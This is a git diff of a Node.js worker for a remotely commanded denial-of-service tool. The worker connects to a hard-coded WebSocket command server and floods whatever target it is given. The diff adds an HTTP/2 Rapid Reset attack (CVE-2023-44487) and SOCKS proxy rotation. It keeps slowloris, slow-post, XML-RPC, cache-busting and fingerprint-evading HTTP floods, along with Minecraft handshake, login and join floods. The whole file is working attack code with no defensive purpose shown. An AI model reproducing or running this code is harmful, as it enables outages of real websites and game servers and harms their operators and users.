@@ -1,12 +1,59 @@
 const WebSocket = require('ws');
 const https = require('https');
 const http = require('http');
+const http2 = require('http2');
 const dns = require('dns').promises;
 const net = require('net');
+const fs = require('fs');
+const { SocksClient } = require('socks');
 
 // IMPORTANT: Use wss:// for secure WebSocket (Render uses HTTPS)
-// Change this to your Render URL
-const SERVER_URL = 'wss://new2-9ho5.onrender.com'; // ⚠️ wss:// not https://
+const SERVER_URL = 'wss://new2-9ho5.onrender.com';
+
+// Load user agents from headers.txt
+let userAgents = [];
+function loadUserAgents() {
+  try {
+    const data = fs.readFileSync('headers.txt', 'utf8');
+    userAgents = data.split('\n')
+      .map(line => line.trim())
+      .filter(line => line.length > 0);
+    console.log(`[✓] Loaded ${userAgents.length} user agents from headers.txt`);
+  } catch (error) {
+    console.log('[!] headers.txt not found, using default user agents');
+    userAgents = [
+      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+    ];
+  }
+}
+
+// Load proxies from proxies.txt (format: ip:port or ip:port:user:pass)
+let proxies = [];
+function loadProxies() {
+  try {
+    const data = fs.readFileSync('proxies.txt', 'utf8');
+    proxies = data.split('\n')
+      .map(line => line.trim())
+      .filter(line => line.length > 0)
+      .map(line => {
+        const parts = line.split(':');
+        if (parts.length === 2) {
+          return { host: parts[0], port: parseInt(parts[1]) };
+        } else if (parts.length === 4) {
+          return { host: parts[0], port: parseInt(parts[1]), user: parts[2], pass: parts[3] };
+        }
+        return null;
+      })
+      .filter(p => p !== null);
+    console.log(`[✓] Loaded ${proxies.length} proxies from proxies.txt`);
+  } catch (error) {
+    console.log('[!] proxies.txt not found, direct connection will be used');
+  }
+}
+
+// Load files on startup
+loadUserAgents();
+loadProxies();
 
 // DNS Cache to bypass DNS throttling
 const dnsCache = new Map();
@@ -22,18 +69,8 @@ const httpsAgent = new https.Agent({
   keepAlive: true,
   maxSockets: 500,
   maxFreeSockets: 100,
-  rejectUnauthorized: false // Allow self-signed certs
+  rejectUnauthorized: false
 });
-
-// User agents rotation to bypass fingerprinting
-const userAgents = [
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
-];
 
 let ws;
 let isRunning = false;
@@ -41,12 +78,12 @@ let stats = { sent: 0, success: 0, failed: 0 };
 let currentConfig = null;
 let attackStartTime = null;
 let keepAliveInterval = null;
+let http2Sessions = new Map();
 
 function connect() {
   console.log('[*] Connecting to command server...');
   ws = new WebSocket(SERVER_URL);
   
-  // Add timeout for connection
   const connectionTimeout = setTimeout(() => {
     if (ws.readyState !== WebSocket.OPEN) {
       log('⚠ Connection timeout, retrying...');
@@ -59,7 +96,6 @@ function connect() {
     log('✓ Connected to command server');
     ws.send(JSON.stringify({ type: 'identify', role: 'worker' }));
     
-    // Send keepalive every 25 seconds
     if (keepAliveInterval) clearInterval(keepAliveInterval);
     keepAliveInterval = setInterval(() => {
       if (ws && ws.readyState === WebSocket.OPEN) {
@@ -115,18 +151,17 @@ async function startAttack(config) {
   attackStartTime = Date.now();
   
   log(`🎯 Target: ${config.target}`);
-  log(`📊 Duration: ${config.duration}s | Threads: ${config.threads} | Delay: ${config.delay}ms | Method: ${config.method}`);
-  log('🚀 ATTACK STARTED - THREAD MODE');
+  log(`📊 Duration: ${config.duration}s | Threads: ${config.threads} | Delay: ${config.delay}ms`);
+  log(`⚡ Attack Mode: ${config.attackMode || 'standard'}`);
+  log('🚀 ATTACK STARTED');
   
   const endTime = attackStartTime + (config.duration * 1000);
   
-  // Create attack threads
   const threads = [];
   for (let i = 0; i < config.threads; i++) {
     threads.push(attackThread(config, endTime));
   }
   
-  // Stats reporter interval
   const statsInterval = setInterval(() => {
     if (isRunning) {
       reportStats();
@@ -134,15 +169,21 @@ async function startAttack(config) {
     }
   }, 1000);
   
-  // Wait for all threads to complete
   await Promise.all(threads);
   
   clearInterval(statsInterval);
   
+  // Cleanup HTTP/2 sessions
+  http2Sessions.forEach(session => {
+    try {
+      session.close();
+    } catch (e) {}
+  });
+  http2Sessions.clear();
+  
   const duration = ((Date.now() - attackStartTime) / 1000).toFixed(2);
   const rps = (stats.sent / duration).toFixed(2);
   
-  // Send final stats
   reportStats();
   
   if (isRunning) {
@@ -163,10 +204,9 @@ async function startAttack(config) {
 }
 
 async function attackThread(config, endTime) {
-  // Check if this is a Minecraft attack
   const isMinecraft = config.attackMode && config.attackMode.startsWith('minecraft-');
+  const isHTTP2 = config.attackMode === 'http2-rapid-reset';
   
-  // Pre-resolve DNS to bypass DNS throttling
   let resolvedIP = null;
   if (config.bypassDNS || isMinecraft) {
     try {
@@ -177,10 +217,11 @@ async function attackThread(config, endTime) {
     }
   }
   
-  // Don't wait for responses - fire and forget for max speed
   while (isRunning && Date.now() < endTime) {
     if (isMinecraft) {
       sendMinecraftAttack(config, resolvedIP);
+    } else if (isHTTP2) {
+      await sendHTTP2RapidReset(config);
     } else {
       sendRequestNoWait(config, resolvedIP);
     }
@@ -193,7 +234,6 @@ async function attackThread(config, endTime) {
 }
 
 async function resolveDNS(hostname) {
-  // Check cache first
   if (dnsCache.has(hostname)) {
     return dnsCache.get(hostname);
   }
@@ -210,7 +250,13 @@ async function resolveDNS(hostname) {
 }
 
 function getRandomUserAgent() {
+  if (userAgents.length === 0) return 'Mozilla/5.0';
   return userAgents[Math.floor(Math.random() * userAgents.length)];
+}
+
+function getRandomProxy() {
+  if (proxies.length === 0) return null;
+  return proxies[Math.floor(Math.random() * proxies.length)];
 }
 
 function getRandomHeaders(config) {
@@ -223,7 +269,6 @@ function getRandomHeaders(config) {
     'Upgrade-Insecure-Requests': '1'
   };
   
-  // Random headers to bypass fingerprinting
   if (config.randomHeaders) {
     const extraHeaders = {
       'DNT': '1',
@@ -235,7 +280,6 @@ function getRandomHeaders(config) {
       'X-Requested-With': 'XMLHttpRequest'
     };
     
-    // Randomly add some extra headers
     Object.keys(extraHeaders).forEach(key => {
       if (Math.random() > 0.5) {
         headers[key] = extraHeaders[key];
@@ -243,7 +287,6 @@ function getRandomHeaders(config) {
     });
   }
   
-  // Add custom referer if enabled
   if (config.randomReferer) {
     const referers = [
       'https://www.google.com/',
@@ -257,7 +300,6 @@ function getRandomHeaders(config) {
     headers['Referer'] = referers[Math.floor(Math.random() * referers.length)];
   }
   
-  // Cookie flooding
   if (config.cookieFlood) {
     const cookies = [];
     for (let i = 0; i < 10; i++) {
@@ -266,7 +308,6 @@ function getRandomHeaders(config) {
     headers['Cookie'] = cookies.join('; ');
   }
   
-  // Range header attack (causes multiple chunks)
   if (config.rangeHeader) {
     const start = Math.floor(Math.random() * 1000);
     headers['Range'] = `bytes=${start}-${start + 50}`;
@@ -278,13 +319,11 @@ function getRandomHeaders(config) {
 function getAttackPath(config, url) {
   let path = url.pathname + url.search;
   
-  // Cache busting with random query params
   if (config.cacheBust) {
     const separator = url.search ? '&' : '?';
     path += `${separator}_=${Date.now()}${Math.random()}`;
   }
   
-  // Random query parameters
   if (config.randomParams) {
     const separator = path.includes('?') ? '&' : '?';
     const randomParams = [
@@ -321,7 +360,6 @@ function getAttackPayload(config) {
       });
     
     case 'slow-post':
-      // Return partial data to keep connection open
       return 'data=' + 'A'.repeat(10);
     
     default:
@@ -329,13 +367,50 @@ function getAttackPayload(config) {
   }
 }
 
+// HTTP/2 Rapid Reset Attack (CVE-2023-44487)
+async function sendHTTP2RapidReset(config) {
+  try {
+    const url = new URL(config.target);
+    const sessionKey = `${url.hostname}:${url.port || 443}`;
+    
+    let client = http2Sessions.get(sessionKey);
+    
+    if (!client || client.destroyed) {
+      client = http2.connect(url.origin, {
+        rejectUnauthorized: false
+      });
+      
+      client.on('error', () => {
+        http2Sessions.delete(sessionKey);
+      });
+      
+      http2Sessions.set(sessionKey, client);
+    }
+    
+    // Create stream and immediately reset it (Rapid Reset)
+    const stream = client.request({
+      ':method': config.method || 'GET',
+      ':path': getAttackPath(config, url),
+      'user-agent': getRandomUserAgent()
+    });
+    
+    // Immediately send RST_STREAM to reset the request
+    stream.close(http2.constants.NGHTTP2_CANCEL);
+    
+    stats.success++;
+    
+  } catch (error) {
+    stats.failed++;
+  }
+}
+
 function sendRequestNoWait(config, resolvedIP) {
-  // Fire request without waiting for response
   try {
     const url = new URL(config.target);
     const protocol = url.protocol === 'https:' ? https : http;
     const agent = url.protocol === 'https:' ? httpsAgent : httpAgent;
     const mode = config.attackMode || 'standard';
+    const proxy = getRandomProxy();
     
     const options = {
       hostname: resolvedIP || url.hostname,
@@ -343,75 +418,53 @@ function sendRequestNoWait(config, resolvedIP) {
       path: getAttackPath(config, url),
       method: config.method,
       headers: getRandomHeaders(config),
-      timeout: mode === 'slowloris' ? 300000 : 5000, // 5 minutes for slowloris
+      timeout: mode === 'slowloris' ? 300000 : 5000,
       agent: agent
     };
     
-    // Add Host header when using IP
     if (resolvedIP) {
       options.headers['Host'] = url.hostname;
     }
     
-    // XML-RPC specific headers
     if (mode === 'xmlrpc') {
       options.method = 'POST';
       options.headers['Content-Type'] = 'text/xml';
       options.path = '/xmlrpc.php';
     }
     
-    // API abuse headers
     if (mode === 'api-abuse') {
       options.method = 'POST';
       options.headers['Content-Type'] = 'application/json';
     }
     
-    const req = protocol.request(options, (res) => {
-      stats.success++;
-      res.resume(); // Drain response without reading
-    });
-    
-    req.on('error', () => {
-      stats.failed++;
-    });
-    
-    req.on('timeout', () => {
-      stats.failed++;
-      req.destroy();
-    });
-    
-    // Handle different attack modes
-    if (mode === 'slowloris') {
-      // Send partial headers slowly
-      req.write('X-');
-      setTimeout(() => {
-        if (!req.destroyed) {
-          req.write('a: b\r\n');
+    // Proxy support
+    if (proxy) {
+      const socksOptions = {
+        proxy: {
+          host: proxy.host,
+          port: proxy.port,
+          type: 5
+        },
+        command: 'connect',
+        destination: {
+          host: options.hostname,
+          port: options.port
         }
-      }, 10000);
-      // Don't end the request - keep it hanging
-    } else if (mode === 'slow-post') {
-      // Send data very slowly
-      const payload = getAttackPayload(config);
-      let sent = 0;
-      const interval = setInterval(() => {
-        if (sent < payload.length && !req.destroyed) {
-          req.write(payload.charAt(sent));
-          sent++;
-        } else {
-          clearInterval(interval);
-          req.end();
-        }
-      }, 1000);
-    } else {
-      // Normal request with payload
-      const payload = getAttackPayload(config);
-      if (payload && (config.method === 'POST' || config.method === 'PUT' || config.method === 'PATCH')) {
-        if (mode === 'xmlrpc') {
-          options.headers['Content-Length'] = Buffer.byteLength(payload);
-        }
-        req.write(payload);
+      };
+      
+      if (proxy.user && proxy.pass) {
+        socksOptions.proxy.userId = proxy.user;
+        socksOptions.proxy.password = proxy.pass;
       }
-      req.end();
+      
+      SocksClient.createConnection(socksOptions).then(info => {
+        options.createConnection = () => info.socket;
+        makeRequest(protocol, options, config, mode);
+      }).catch(() => {
+        stats.failed++;
+      });
+    } else {
+      makeRequest(protocol, options, config, mode);
     }
     
   } catch (error) {
@@ -419,55 +472,56 @@ function sendRequestNoWait(config, resolvedIP) {
   }
 }
 
-async function sendRequest(config) {
-  stats.sent++;
-  
-  return new Promise((resolve) => {
-    try {
-      const url = new URL(config.target);
-      const protocol = url.protocol === 'https:' ? https : http;
-      
-      const options = {
-        hostname: url.hostname,
-        port: url.port || (url.protocol === 'https:' ? 443 : 80),
-        path: url.pathname + url.search,
-        method: config.method,
-        headers: {
-          'User-Agent': 'StressTest-Worker/1.0',
-          'Accept': '*/*'
-        },
-        timeout: 10000
-      };
-      
-      const req = protocol.request(options, (res) => {
-        stats.success++;
-        res.on('data', () => {}); // Consume response
-        res.on('end', () => resolve());
-      });
-      
-      req.on('error', () => {
-        stats.failed++;
-        resolve();
-      });
-      
-      req.on('timeout', () => {
-        stats.failed++;
-        req.destroy();
-        resolve();
-      });
-      
-      req.end();
-      
-    } catch (error) {
-      stats.failed++;
-      resolve();
-    }
+function makeRequest(protocol, options, config, mode) {
+  const req = protocol.request(options, (res) => {
+    stats.success++;
+    res.resume();
   });
+  
+  req.on('error', () => {
+    stats.failed++;
+  });
+  
+  req.on('timeout', () => {
+    stats.failed++;
+    req.destroy();
+  });
+  
+  if (mode === 'slowloris') {
+    req.write('X-');
+    setTimeout(() => {
+      if (!req.destroyed) {
+        req.write('a: b\r\n');
+      }
+    }, 10000);
+  } else if (mode === 'slow-post') {
+    const payload = getAttackPayload(config);
+    let sent = 0;
+    const interval = setInterval(() => {
+      if (sent < payload.length && !req.destroyed) {
+        req.write(payload.charAt(sent));
+        sent++;
+      } else {
+        clearInterval(interval);
+        req.end();
+      }
+    }, 1000);
+  } else {
+    const payload = getAttackPayload(config);
+    if (payload && (config.method === 'POST' || config.method === 'PUT' || config.method === 'PATCH')) {
+      if (mode === 'xmlrpc') {
+        options.headers['Content-Length'] = Buffer.byteLength(payload);
+      }
+      req.write(payload);
+    }
+    req.end();
+  }
 }
 
 function stopAttack() {
   if (isRunning) {
     isRunning = false;
+    reportStats();
     log('⏹ Attack stopped');
   }
 }
@@ -521,12 +575,12 @@ function writeString(str) {
 }
 
 function createHandshakePacket(host, port) {
-  const packetId = Buffer.from([0x00]); // Handshake packet ID
-  const protocolVersion = writeVarInt(754); // 1.16.5
+  const packetId = Buffer.from([0x00]);
+  const protocolVersion = writeVarInt(754);
   const serverAddress = writeString(host);
   const serverPort = Buffer.allocUnsafe(2);
   serverPort.writeUInt16BE(port, 0);
-  const nextState = writeVarInt(1); // Status request
+  const nextState = writeVarInt(1);
   
   const data = Buffer.concat([packetId, protocolVersion, serverAddress, serverPort, nextState]);
   const length = writeVarInt(data.length);
@@ -535,13 +589,13 @@ function createHandshakePacket(host, port) {
 }
 
 function createStatusRequestPacket() {
-  const packetId = Buffer.from([0x00]); // Status request
+  const packetId = Buffer.from([0x00]);
   const length = writeVarInt(1);
   return Buffer.concat([length, packetId]);
 }
 
 function createLoginStartPacket(username) {
-  const packetId = Buffer.from([0x00]); // Login start
+  const packetId = Buffer.from([0x00]);
   const playerName = writeString(username);
   const data = Buffer.concat([packetId, playerName]);
   const length = writeVarInt(data.length);
@@ -560,7 +614,6 @@ function sendMinecraftAttack(config, resolvedIP) {
     socket.connect(port, target, () => {
       switch(mode) {
         case 'minecraft-handshake':
-          // Handshake flood - sends initial connection packets
           const handshake = createHandshakePacket(config.target, port);
           socket.write(handshake);
           socket.destroy();
@@ -568,7 +621,6 @@ function sendMinecraftAttack(config, resolvedIP) {
           break;
           
         case 'minecraft-ping':
-          // Ping flood - requests server status
           const handshakeForPing = createHandshakePacket(config.target, port);
           const statusRequest = createStatusRequestPacket();
           socket.write(Buffer.concat([handshakeForPing, statusRequest]));
@@ -577,25 +629,21 @@ function sendMinecraftAttack(config, resolvedIP) {
           break;
           
         case 'minecraft-login':
-          // Login spam - attempts login with random usernames
           const randomUser = 'Bot_' + Math.random().toString(36).substring(7);
           const handshakeForLogin = createHandshakePacket(config.target, port);
-          handshakeForLogin[handshakeForLogin.length - 1] = 0x02; // Change to login state
+          handshakeForLogin[handshakeForLogin.length - 1] = 0x02;
           const loginStart = createLoginStartPacket(randomUser);
           socket.write(Buffer.concat([handshakeForLogin, loginStart]));
-          // Keep connection open to consume server resources
           setTimeout(() => socket.destroy(), 10000);
           stats.success++;
           break;
           
         case 'minecraft-join':
-          // Join flood - full connection attempt
           const joinUser = 'Player_' + Math.random().toString(36).substring(7);
           const handshakeForJoin = createHandshakePacket(config.target, port);
           handshakeForJoin[handshakeForJoin.length - 1] = 0x02;
           const loginPacket = createLoginStartPacket(joinUser);
           socket.write(Buffer.concat([handshakeForJoin, loginPacket]));
-          // Don't destroy - keep connection to fill slots
           stats.success++;
           break;
       }
@@ -616,10 +664,6 @@ function sendMinecraftAttack(config, resolvedIP) {
   }
 }
 
-function sleep(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
-
 // ASCII Banner
 console.log(`
 ╔════════════════════════════════════════╗
@@ -633,10 +677,8 @@ console.log(`
 ╚════════════════════════════════════════╝
 `);
 
-// Start connection
 connect();
 
-// Handle graceful shutdown
 process.on('SIGINT', () => {
   console.log('\n\n[!] Shutting down worker...');
   stopAttack();
